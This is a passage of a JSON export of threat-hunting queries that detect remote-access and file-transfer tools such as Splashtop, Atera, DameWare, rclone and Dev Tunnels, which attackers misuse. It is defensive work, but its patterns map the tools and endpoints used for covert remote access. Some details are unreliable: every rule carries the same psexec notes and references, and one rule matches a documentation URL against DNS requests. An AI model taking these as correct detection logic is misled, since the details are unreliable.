        "pk": 16
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential processes activity of Dropbox RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential Dropbox RMM Tool Process Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and src.process.image.path contains \"\\Dropbox.exe\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 17
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential processes activity of Splashtop RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential Splashtop RMM Tool Process Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and src.process.image.path contains \"strwinclt.exe\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 18
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential processes activity of Splashtop (Beta) RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential Splashtop (Beta) RMM Tool Process Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"SRServer.exe\" or src.process.image.path contains \"SplashtopSOS.exe\" or src.process.image.path=\"*Splashtop_Streamer_Windows*.exe\" or src.process.image.path contains \"SRManager.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 19
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential processes activity of Connectwise Automate (LabTech) RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential Connectwise Automate (LabTech) RMM Tool Process Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"ltsvc.exe\" or src.process.image.path contains \"ltsvcmon.exe\" or src.process.image.path contains \"lttray.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 20
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential processes activity of 247ithelp.com (ConnectWise) RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential 247ithelp.com (ConnectWise) RMM Tool Process Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and src.process.image.path contains \"Remote Workforce Client.exe\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 21
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential processes activity of FileZilla RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential FileZilla RMM Tool Process Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and src.process.image.path contains \"\\FileZilla.exe\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 22
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential network activity of ConnectWise Control RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential ConnectWise Control RMM Tool Network Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "(event.category in (\"DNS\",\"Url\",\"IP\")) and (endpoint.os=\"windows\" and ((url.address contains \"live.screenconnect.com\" or url.address contains \"control.connectwise.com\") or (event.dns.request contains \"live.screenconnect.com\" or event.dns.request contains \"control.connectwise.com\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 23
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential network activity of Visual Studio Dev Tunnel RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential Visual Studio Dev Tunnel RMM Tool Network Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "(event.category in (\"DNS\",\"Url\",\"IP\")) and (endpoint.os=\"windows\" and ((url.address contains \"global.rel.tunnels.api.visualstudio.com\" or url.address contains \".rel.tunnels.api.visualstudio.com\" or url.address contains \".devtunnels.ms\") or (event.dns.request contains \"global.rel.tunnels.api.visualstudio.com\" or event.dns.request contains \".rel.tunnels.api.visualstudio.com\" or event.dns.request contains \".devtunnels.ms\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 24
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential processes activity of Azure Storage Explorer RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential Azure Storage Explorer RMM Tool Process Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and src.process.image.path contains \"\\StorageExplorer.exe\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 25
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential processes activity of DameWare RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential DameWare RMM Tool Process Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path=\"*SolarWinds-Dameware-DRS*.exe\" or src.process.image.path=\"*DameWare Mini Remote Control*.exe\" or src.process.image.path contains \"dwrcs.exe\" or src.process.image.path contains \"\\dwrcst.exe\" or src.process.image.path contains \"DameWare Remote Support.exe\" or src.process.image.path=\"*SolarWinds-Dameware-MRC*.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 26
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential processes activity of Bitvise SSH Client RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential Bitvise SSH Client RMM Tool Process Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and src.process.image.path contains \"\\BvSshClient-Inst.exe\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 27
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential network activity of Splashtop RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential Splashtop RMM Tool Network Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "(event.category in (\"DNS\",\"Url\",\"IP\")) and (endpoint.os=\"windows\" and (url.address contains \".splashtop.com\" or event.dns.request contains \".splashtop.com\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 28
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential processes activity of rclone RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential rclone RMM Tool Process Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and src.process.image.path contains \"\\rclone.exe\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 29
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential network activity of Dameware-mini remote control Protocol RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential Dameware-mini remote control Protocol RMM Tool Network Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "(event.category in (\"DNS\",\"Url\",\"IP\")) and (endpoint.os=\"windows\" and (url.address contains \"dameware.com\" or event.dns.request contains \"dameware.com\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 30
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential files activity of Alpemix RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential Alpemix RMM Tool File Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.category=\"file\" and (endpoint.os=\"windows\" and tgt.file.path contains \"%localappdata%\\Alpemix\\Alpemix.ini\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 31
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential network activity of Quick Assist RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential Quick Assist RMM Tool Network Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "(event.category in (\"DNS\",\"Url\",\"IP\")) and (endpoint.os=\"windows\" and (url.address contains \".support.services.microsoft.com\" or event.dns.request contains \".support.services.microsoft.com\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 32
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential network activity of Atera RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential Atera RMM Tool Network Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "(event.category in (\"DNS\",\"Url\",\"IP\")) and (endpoint.os=\"windows\" and ((url.address contains \"pubsub.atera.com\" or url.address contains \"pubsub.pubnub.com\" or url.address contains \"agentreporting.atera.com\" or url.address contains \"getalphacontrol.com\" or url.address contains \"app.atera.com\" or url.address contains \"agenthb.atera.com\" or url.address contains \"packagesstore.blob.core.windows.net\" or url.address contains \"ps.pndsn.com\" or url.address contains \"agent-api.atera.com\" or url.address contains \"cacerts.thawte.com\" or url.address contains \"agentreportingstore.blob.core.windows.net\" or url.address contains \"atera-agent-heartbeat.servicebus.windows.net\" or url.address contains \"ps.atera.com\" or url.address contains \"atera.pubnubapi.com\" or url.address contains \"appcdn.atera.com\") or (event.dns.request contains \"pubsub.atera.com\" or event.dns.request contains \"pubsub.pubnub.com\" or event.dns.request contains \"agentreporting.atera.com\" or event.dns.request contains \"getalphacontrol.com\" or event.dns.request contains \"app.atera.com\" or event.dns.request contains \"agenthb.atera.com\" or event.dns.request contains \"packagesstore.blob.core.windows.net\" or event.dns.request contains \"ps.pndsn.com\" or event.dns.request contains \"agent-api.atera.com\" or event.dns.request contains \"cacerts.thawte.com\" or event.dns.request contains \"agentreportingstore.blob.core.windows.net\" or event.dns.request contains \"atera-agent-heartbeat.servicebus.windows.net\" or event.dns.request contains \"ps.atera.com\" or event.dns.request contains \"atera.pubnubapi.com\" or event.dns.request contains \"appcdn.atera.com\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 33
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential network activity of Dev Tunnels (aka Visual Studio Dev Tunnel) RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential Dev Tunnels (aka Visual Studio Dev Tunnel) RMM Tool Network Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "(event.category in (\"DNS\",\"Url\",\"IP\")) and (endpoint.os=\"windows\" and (url.address contains \"learn.microsoft.com/en-us/azure/developer/dev-tunnels/overview\" or event.dns.request contains \"learn.microsoft.com/en-us/azure/developer/dev-tunnels/overview\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 34
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential files activity of mRemoteNG RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential mRemoteNG RMM Tool File Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.category=\"file\" and (endpoint.os=\"windows\" and (tgt.file.path contains \"C:\\Users\\*\\AppData\\Roaming\\mRemoteNG\\mRemoteNG.log\" or tgt.file.path contains \"C:\\Users\\*\\AppData\\Roaming\\mRemoteNG\\confCons.xml\" or tgt.file.path=\"*C:\\Users\\*\\AppData\\*\\mRemoteNG\\**10\\user.config\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
